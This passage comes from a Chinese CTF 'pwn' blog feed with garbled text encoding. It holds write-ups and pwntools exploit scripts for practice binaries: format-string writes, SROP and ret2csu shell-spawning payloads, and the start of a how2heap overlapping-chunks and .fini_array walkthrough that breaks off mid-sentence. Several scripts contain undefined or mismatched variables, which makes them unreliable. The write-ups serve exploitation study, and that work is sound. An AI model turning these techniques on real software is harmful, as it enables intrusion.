class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so&#x27;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>print(hex(system_addr))<br><br>payload = fmtstr_payload(<span class="hljs-number">10</span>,&#123;printf_got:system_addr&#125;)<br>a.sendlineafter(<span class="hljs-string">&#x27;slogan: &#x27;</span>,payload)<br>a.sendlineafter(<span class="hljs-string">&#x27;slogan: &#x27;</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>a.interactive()<br> <br></code></pre></td></tr></table></figure><h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><p>mainå‡½æ•°ä¸­çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/fm_main.png"></p><p>åœ¨ <code>printf(buf)</code> å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå†å¾€ä¸‹çš„ <em>x</em> å˜é‡åœ¨ data æ®µï¼Œæˆ‘ä»¬é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„å†™çš„æ¼æ´ä¿®æ”¹ <em>x</em> çš„å€¼å³å¯ã€‚</p><p>è®¡ç®—å‡ºå­—ç¬¦ä¸²è¾“å…¥å¤„çš„åç§»æ˜¯11</p><p><img src="/img/%E5%A4%8D%E5%81%A5/fm_padding.png"></p><blockquote><p>ï¼ˆnilï¼‰ä¹Ÿç®—ä¸€ä½åç§»ï¼Œ32ä½æ²¡æœ‰å¯„å­˜å™¨ä¼ å‚æ‰€ä»¥æ ˆä¸Šåç§»æ˜¯å¤šå°‘å°±æ˜¯å¤šå°‘</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./fm&#x27;</span>)<br><br>x_add=<span class="hljs-number">0x804A02C</span><br><br>payload=p32(x_add)+<span class="hljs-string">b&quot;%11$n&quot;</span><br><span class="hljs-comment">#å…ˆæŠŠxçš„åœ°å€ä¼ åˆ°æ ˆä¸Šï¼Œå†ä¿®æ”¹æ­¤å¤„çš„åœ°å€ä¸ºxåœ°å€çš„é•¿åº¦å³4å­—èŠ‚ (è¿™ä¸ªåœ°æ–¹æ˜¯å‡‘å·§äº†ï¼Œå¦‚æœæ›´å¤§çš„æ•°å­—æ¯”å¦‚6å°±è¦å¡«å……paddingè¡¥å……)</span><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ç³»ç»Ÿè°ƒç”¨-srop"><a href="#ç³»ç»Ÿè°ƒç”¨-srop" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨ srop"></a>ç³»ç»Ÿè°ƒç”¨ srop</h1><h3 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h3><p>vulnå‡½æ•°é‡Œä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_s_3_vuln.png"></p><p>å‘ç°æœ‰ä¸€ä¸ª gadget() å‡½æ•°ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªreturn 15Lï¼Œç‚¹è¿›æ±‡ç¼–æºç é‚£ä¸€é¡µå¯ä»¥å‘ç°ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªè¿”å› 59 çš„ä»£ç ã€‚æˆ‘ä»¬å¯ä»¥å¦å¤–åˆ©ç”¨è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_s_3_15_59.png"></p><blockquote><p>ç³»ç»Ÿè°ƒç”¨ï¼š</p><p>æ¯ä¸€ä¸ªç³»ç»Ÿå‡½æ•°éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œä¾‹å¦‚ï¼š</p><p><code>sys_read</code> çš„è°ƒç”¨å·ä¸º 0 ã€<code>sys_write</code> çš„è°ƒç”¨å·ä¸º 1ã€<code>stub_execve</code> çš„è°ƒç”¨å·ä¸º 59ã€<code>stub_rt_sigreturn</code> çš„è°ƒç”¨å·ä¸º 15</p></blockquote><p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªé¢˜çš„æ±‡ç¼–ä»£ç ä¸­åªæœ‰ <code>ret</code> ï¼Œæ²¡æœ‰ <code>leave</code> æŒ‡ä»¤ï¼Œæ‰€ä»¥å®ƒä¸ä¼šæ‰§è¡Œ mov ebpï¼Œesp | pop ebpã€‚åªè¦è¦†ç›–ä½ 0x10 çš„ç¼“å†²åŒºå°±å¯ä»¥åŒæ—¶è¦†ç›–ä½è¿”å›åœ°å€ã€‚</p><h4 id="æ–¹æ³•ä¸€-SROPï¼š"><a href="#æ–¹æ³•ä¸€-SROPï¼š" class="headerlink" title="æ–¹æ³•ä¸€-SROPï¼š"></a>æ–¹æ³•ä¸€-SROPï¼š</h4><p>è§£é¢˜æ€è·¯å°±æ˜¯å¯ä»¥é€šè¿‡ read ä¼ªé€ ä¸€ä¸ª sigreturn frame åœ¨æ ˆä¸­ï¼Œç„¶åæ‰§è¡Œ sigreturn çš„ç³»ç»Ÿè°ƒç”¨</p><p>æœ¬é¢˜ä¸­ä¸å­˜åœ¨ <code>&#39;/bin/sh&#39;</code> å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è¾“å…¥ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºé¦–å…ˆåˆ©ç”¨æœ¬é¢˜çš„ sys_read å»è¯»ä¸€ä¸ª â€˜&#x2F;bin&#x2F;shâ€™ ï¼Œå› ä¸ºæ ˆä¸­çš„ä½ç½®éƒ½æ˜¯é€šè¿‡åç§»ç¡®å®šçš„ï¼Œæ‰€ä»¥è¦ç¡®å®šæ ˆåç§»ã€‚</p><p><code>æ ˆåœ°å€-å­—ç¬¦ä¸²åœ¨æ ˆä¸­çš„åœ°å€ = offset</code></p><p>åœ¨ main å‡½æ•°å¼€å§‹æ—¶ rsi å­˜çš„ä¾¿æ˜¯æ ˆåœ°å€ï¼Œæˆ‘ä»¬é€šè¿‡ GDB æ¥è°ƒè¯•æŸ¥çœ‹</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_s_3_rsi.png"></p><p>æˆ‘ä»¬åœ¨readæ—¶è¾“å…¥ â€˜&#x2F;bin&#x2F;shâ€™ ï¼Œå°±å¯ä»¥æŸ¥çœ‹å®ƒåœ¨æ ˆä¸Šçš„åç§»</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_s_3_offest.png"></p><p>æ‰€ä»¥ <code>offest=0xf48-0xe30=0x118</code>ï¼Œbinsh_addr&#x3D;æ ˆåœ°å€-0x118</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(payload)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>bin_sh=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br><br>syscall_ret=<span class="hljs-number">0x0400517</span>   <span class="hljs-comment"># syscall ; ret</span><br>rax=<span class="hljs-number">0x004004DA</span>  <span class="hljs-comment">#mov rax, 0Fh;ret</span><br><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span><br>frame.rdi = bin_sh<br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_ret<br><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(syscall_ret)+<span class="hljs-built_in">bytes</span>(frame)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•ä¸€-ret2csuï¼š"><a href="#æ–¹æ³•ä¸€-ret2csuï¼š" class="headerlink" title="æ–¹æ³•ä¸€-ret2csuï¼š"></a>æ–¹æ³•ä¸€-ret2csuï¼š</h4><p>å› ä¸ºç¨‹åºä¸­æœ‰ 59 ç³»ç»Ÿè°ƒç”¨å·ï¼Œæ‰€ä»¥æƒ³åŠæ³•æ§åˆ¶å¯„å­˜å™¨çš„å€¼è°ƒç”¨ execve(â€œ&#x2F;bin&#x2F;shâ€,0,0)ã€‚ä¸€å…±éœ€è¦ä¼ ä¸‰ä¸ªå‚æ•°ï¼Œå› ä¸ºæ˜¯ 64 ä½æ‰€ä»¥éœ€è¦ rdi , rsi ,å’Œ rdx ä¸‰ä¸ªå¯„å­˜å™¨ç”¨æ¥ä¼ å‚ã€‚åˆ†åˆ«å¯¹åº”ï¼š</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">rax:</span> <span class="hljs-number">0</span>x3b<br><span class="hljs-symbol">rdi:</span> <span class="hljs-comment">&#x27;/bin/sh&#x27;</span><br><span class="hljs-symbol">rsi:</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">rdx:</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><code>mov rax ,3b</code> å°±æ˜¯ä¹‹å‰æåˆ°çš„ vuln é‡Œçš„å¯åˆ©ç”¨çš„ä»£ç ç‰‡æ®µã€‚å…¶ä½™çš„å¯ä»¥åœ¨ init_csu å‡½æ•°é‡Œæ‰¾åˆ°å¯¹åº”çš„ gadgetã€‚</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_s_3_csu.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹åŠæ®µçš„ pop æŒ‡ä»¤ï¼Œè®¾ç½® r13ã€r14 ï¼Œå†é€šè¿‡ä¸ŠåŠéƒ¨åˆ†çš„ mov æŒ‡ä»¤å°† r13ã€r14 çš„å€¼åˆ†åˆ«èµ‹å€¼ç»™ rdxã€rsiã€‚å…¶ä½™çš„å¯„å­˜å™¨çš„å€¼æ ¹æ®éœ€è¦è®¾ç½®ã€‚æˆ‘ä»¬ç›®å‰éœ€è¦è®¾ç½®çš„æ˜¯ r13&#x3D;0ã€r14&#x3D;0ã€‚</p><p>æˆ‘ä»¬å½“å‰æ„æƒ³çš„ payload ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_s_3_stack.png"></p><p>éœ€è¦æ³¨æ„ä¸€ä¸‹çš„æ˜¯ï¼Œæˆ‘ä»¬æ‰§è¡Œå®Œæ¯• mov å‘½ä»¤åï¼Œä¼šæ‰§è¡Œ call æŒ‡ä»¤ï¼Œå¯¹åº”è·³è½¬åˆ° <code>r12+rbx*8</code> å¤„ã€‚æ‰€ä»¥æˆ‘ä»¬å°† rbx è®¾ç½®ä¸º 0ï¼Œå°±å¯ä»¥è®©è¿™ä¸€æ­¥æ‰§è¡Œ r12 å¤„æŒ‡å‘çš„æ“ä½œã€‚å¯¹åº”çš„ r12 æˆ‘ä»¬å°±å¯ä»¥å­˜å‚¨æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„åœ°å€ mov_rax_addrã€‚</p><p>é‚£ <code>pop_rdi</code> æ€ä¹ˆæ‰§è¡Œå‘¢ï¼Ÿ</p><p>ç¨‹åºå›åˆ° csu åä¼šè‡ªåŠ¨ç»™ rbx+1 ï¼Œéšåè¿›è¡Œ rbx ä¸ rbp çš„æ¯”è¾ƒï¼Œå¦‚æœæ¯”è¾ƒç»“æœä¸åŒå°±ä¼šè·³è½¬åˆ°mov æŒ‡ä»¤å¤„å†æ¬¡æ‰§è¡Œï¼Œè¿™æ—¶call ä¼šè·³è½¬åˆ°<code>r12+8</code>ï¼Œæ­£å¥½å°±æ˜¯ <code>pop_rdi</code> ã€‚</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬è¦ç»™ rbx å’Œ rbp éƒ½èµ‹å€¼ 0ï¼Œç»™ r12 å¤åˆ¶å­˜å‚¨  mov_rax_addr çš„åœ°å€ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨åç§»æ¥ç¡®å®šï¼Œå°±æ˜¯ â€˜&#x2F;bin&#x2F;shâ€™+0x50 ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>mov_addr=<span class="hljs-number">0x0400580</span><br>pop_add=<span class="hljs-number">0x040059A</span><br>mov_rax=<span class="hljs-number">0x04004E2</span><br>pop_rdi=<span class="hljs-number">0x04005a3</span> <br>syscall_addr=<span class="hljs-number">0x0400501</span><br><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br>sh.sendline(payload)<br><br>stack_add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>bin_sh=u64(add)-<span class="hljs-number">0x118</span><br><br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(pop_addr)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(bin_sh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload+=p64(mov_addr)+p64(mov_rax)<br>payload+=p64(pop_rdi)+p64(bin_sh)+p64(syscall_addr)<br> <br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p>è„‘è¢‹ç¬¨ç¬¨çš„ğŸ¥¹</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²</tag>
      
      <tag>æ•´æ•°æº¢å‡º</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>how2heapæ·±å…¥æµ…å‡ºå­¦ä¹ å †åˆ©ç”¨(äºŒ)</title>
    <link href="/2024/03/05/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%BA%8C/"/>
    <url>/2024/03/05/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<p>ç»§ç»­how2heap</p><span id="more"></span><h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><blockquote><p>è¿™ä¸€éƒ¨åˆ†åœ¨ how2heap é‡Œæ˜¯åˆ† 1 å’Œ 2 çš„ï¼Œ1 çš„åŸç†æ˜¯ï¼šé€šè¿‡æº¢å‡ºæ¼æ´ä¿®æ”¹ç©ºé—²å †å—çš„ size ï¼Œå°†åœ°å€ç›¸é‚»çš„ä¸¤ä¸ª chunk â€œåˆå¹¶â€ã€‚ å¦‚æœ free åå†æ¬¡ç”³è¯·ä¸€ä¸ªå¤§å°åŒ¹é…çš„å †å—ï¼Œå°±ä¼šå †å—çš„é‡å ã€‚</p><p>æ¯”è¾ƒç®€å•ä¸€çœ‹å°±æ‡‚ï¼Œå°±ç•¥è¿‡ç›´æ¥å¼€å§‹ 2 äº†</p></blockquote><p><strong>åŸç†ï¼š</strong>åœ¨é‡Šæ”¾å †å—ä¹‹å‰ä¿®æ”¹å®ƒçš„ size å¤§å°ï¼Œç­‰å®ƒè¢«é‡Šæ”¾åï¼Œé”™è¯¯åœ°ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„ prev_sizeï¼Œå¯¼è‡´ä¸­é—´çš„chunk å¼ºè¡Œåˆå¹¶ã€‚</p><p><strong>GDB è°ƒè¯•</strong></p><p>æˆ‘ä»¬åœ¨æœ¬æ¬¡å®éªŒä¸­å…±åˆ†é…äº”ä¸ªå †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå †å—ç”¨äºæ¨¡æ‹Ÿæº¢å‡ºæ¼æ´æ¥æ”¹å†™ç¬¬äºŒä¸ªå †å—çš„æ•°æ®ï¼Œæˆ‘ä»¬ç›®æ ‡é‡å çš„éƒ¨åˆ†æ˜¯ç¬¬äºŒè‡³ç¬¬å››ä¸ªå †å—ï¼Œç¬¬äº”ä¸ªå †å—ç”¨äºé˜²æ­¢ä¸ top chunk åˆå¹¶ã€‚</p><p>æˆ‘ä»¬å…ˆ free chunk 4 </p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free4.png"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ©ç”¨ chunk1 çš„æº¢å‡ºæ¼æ´æ¥æ”¹å†™ chunk2 çš„ size å€¼ã€‚å°† size æ”¹ä¸º chunk2 å’Œ chunk3 çš„å¤§å°ä¹‹å’Œï¼Œåœ¨æœ¬æ¬¡å®ä¾‹ä¸­å°±æ˜¯ <code>0x3f0+0x3f0+0x1=0x7e1</code></p><p>è¿™æ—¶æˆ‘ä»¬å† free 2ï¼Œæ ¹æ®è¿™ä¸ªè¢«ä¿®æ”¹çš„ size å€¼ï¼Œç¨‹åºä¼šä»¥ä¸º chunk 2 åŠ ä¸Š chunk 3 çš„åŒºåŸŸéƒ½æ˜¯è¦é‡Šæ”¾çš„ï¼Œå°±ä¼šé”™è¯¯åœ°ä¿®æ”¹äº†chunk 5çš„ prev_size ã€‚</p><p>æ¥ç€ï¼Œå®ƒå‘ç°ç´§é‚»çš„ä¸€å—chunk 4ä¹Ÿæ˜¯ free çŠ¶æ€ï¼Œå°±æŠŠå®ƒä¿©åˆå¹¶åœ¨äº†ä¸€èµ·ï¼Œç»„æˆä¸€ä¸ªå¤§free chunkï¼Œæ”¾è¿›unsorted binä¸­ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free2.png"></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯¹ chunk3 é€ æˆäº†é‡å ï¼Œå¯ä»¥æ”¹å†™å…¶ä¸­çš„å†…å®¹äº†ã€‚</p><h3 id="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-Hack-lu-CTF-2015-Bookstore"><a href="#ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-Hack-lu-CTF-2015-Bookstore" class="headerlink" title="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ Hack.lu CTF 2015 Bookstore"></a>ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ Hack.lu CTF 2015 Bookstore</h3><p>é¢˜ç›®æ˜¯ä¸€ä¸ªè®¢ä¹¦ç³»ç»Ÿï¼Œé€‰é¡¹1-5 å¯¹åº” 1ã€2 ç¼–è¾‘è®¢å•ä¿¡æ¯ï¼Œ3ã€4åˆ é™¤è®¢å•ä¿¡æ¯ï¼Œ5 æäº¤è®¢å•ä¿¡æ¯ã€‚</p><p>å…¶ä¸­1ã€2 çš„ç¼–è¾‘åŠŸèƒ½ç”¨åŒä¸€ä¸ªå‡½æ•°å®ç°ï¼Œå­˜åœ¨æº¢å‡ºæ¼æ´</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/bookstore_edit.png"></p><p>åˆ é™¤è®¢è´­å•æ˜¯ free æ‰äº†å¯¹åº”çš„æŒ‡é’ˆï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆæŒ‡é’ˆç½®ä¸º NULLï¼Œå­˜åœ¨ UAF æ¼æ´ã€‚</p><p>æœ€åæäº¤åŠŸèƒ½ä¸­æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªæ¼æ´åœ¨ submit åŠŸèƒ½ä¸­ï¼Œåªèƒ½åˆ©ç”¨ä¸€æ¬¡ã€‚</p><ul><li>é¦–å…ˆè€ƒè™‘å¦‚ä½•åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼š</li></ul><p>æˆ‘ä»¬å¿…é¡»å¾—è¦æ§åˆ¶ dest çš„å†…å®¹æ‰èƒ½è¿›è¡Œæ¼æ´çš„åˆ©ç”¨ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•æ§åˆ¶å‘¢ï¼Ÿç¨‹åºæœ€å¼€å§‹çš„æ—¶å€™åˆ†é…äº†ä¸‰ä¸ªè¿ç»­çš„å †å— <em>v6</em>ã€<em>v7</em> å’Œ <em>dest</em>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡º <em>v7</em> æ¥ä¿®æ”¹ <em>dest</em> çš„å†…å®¹ã€‚ä½†æ˜¯æœ€åä¼šè¢«æ”¹å†™ä¸ºå›ºå®šçš„å†…å®¹ â€œYour order is submittedâ€ã€‚</p><blockquote><p>çœŸå¥‡æ€ªæˆ‘çœ‹èŠ±çœ¼ä¹Ÿæ²¡çœ‹å‡ºæ¥å“ªé‡Œç»™å®ƒèµ‹å€¼äº†</p></blockquote><p>åœ¨æœ€åæ‰§è¡Œ submitted çš„æ—¶å€™ä¼šç”³è¯·ä¸€ä¸ª <em>v5</em> ï¼Œè¿™ä¸ªå †å—çš„æŒ‡é’ˆæ˜¯ä¸ç¡®å®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥ä» top chunk é‡Œé‡æ–°åˆ†é…ï¼Œä¹Ÿå¯ä»¥ free æ‰ <em>v6</em> ã€<em>v7</em>ï¼Œä»ä»–ä»¬å½“ä¸­åˆ†é…ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ overlapping ï¼Œåˆ©ç”¨ <em>v7</em> å®ç° dest éƒ¨åˆ†çš„å †é‡å ï¼Œä»è€Œåœ¨ submitted æ—¶æ”¹å†™ <em>dest</em> ã€‚</p><ul><li>å› ä¸ºæˆ‘ä»¬é¦–å…ˆéœ€è¦åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åŸºå€ï¼Œç„¶åéœ€è¦å†åˆ©ç”¨ä¸€æ¬¡å»æ”¹å†™åœ°å€ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•å¤šæ¬¡åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š</li></ul><p>åœ¨æ¥æ”¶ç”¨æˆ·é€‰æ‹©è¾“å…¥æ—¶ï¼Œå…è®¸ç”¨æˆ·è¾“å…¥ 128 é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯é•¿åº¦ä¸å¤Ÿå»åˆ©ç”¨æ ˆæº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨å…¶ä»–çš„æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š<strong>ç¨‹åºé€€å‡ºåä¼šæ‰§è¡Œ <code>.fini_array</code> åœ°å€å¤„çš„å‡½æ•°ï¼Œä¸è¿‡åªèƒ½åˆ©ç”¨ä¸€æ¬¡ã€‚</strong></p><h4 id="ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹-init-array-å’Œ-fini-array-èŠ‚ï¼"><a href="#ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹-init-array-å’Œ-fini-array-èŠ‚ï¼" class="headerlink" title="ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹ .init_array å’Œ  .fini_array èŠ‚ï¼"></a>ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹ .init_array å’Œ  .fini_array èŠ‚ï¼</h4><blockquote><p>å¤§å¤šæ•°å¯æ‰§è¡Œæ–‡ä»¶æ˜¯é€šè¿‡é“¾æ¥ libc æ¥è¿›è¡Œç¼–è¯‘çš„ï¼Œå› æ­¤ gcc ä¼šå°† glibc åˆå§‹åŒ–ä»£ç æ”¾å…¥ç¼–è¯‘å¥½çš„å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«åº“ä¸­ã€‚ .init_arrayå’Œ .fini_array èŠ‚ï¼ˆæ—©æœŸç‰ˆæœ¬è¢«ç§°ä¸º .ctorså’Œ .dtors ï¼‰ä¸­å­˜æ”¾äº†æŒ‡å‘åˆå§‹åŒ–ä»£ç å’Œç»ˆæ­¢ä»£ç çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>.init_array å‡½æ•°æŒ‡é’ˆä¼šåœ¨ main() å‡½æ•°è°ƒç”¨ä¹‹å‰è§¦å‘ã€‚è¿™å°±æ„å‘³ç€ï¼Œå¯ä»¥é€šè¿‡é‡å†™æŸä¸ªæŒ‡å‘æ­£ç¡®åœ°å€çš„æŒ‡é’ˆæ¥å°†æ§åˆ¶æµæŒ‡å‘ç—…æ¯’æˆ–è€…å¯„ç”Ÿä»£ç ã€‚ .fini_array å‡½æ•°æŒ‡é’ˆåœ¨ main() å‡½æ•°æ‰§è¡Œå®Œä¹‹åæ‰è¢«è§¦å‘ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹è¿™ä¸€ç‚¹ä¼šéå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œç‰¹å®šçš„å †æº¢å‡ºæ¼æ´ï¼ˆå¦‚æ›¾ç»çš„ Once upon a free()ï¼‰ä¼šå…è®¸æ”»å‡»è€…åœ¨ä»»æ„ä½ç½®å†™4ä¸ªå­—èŠ‚ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä½¿ç”¨ä¸€ä¸ªæŒ‡å‘ shellcode åœ°å€çš„å‡½æ•°æŒ‡é’ˆæ¥é‡å†™ .fini_array 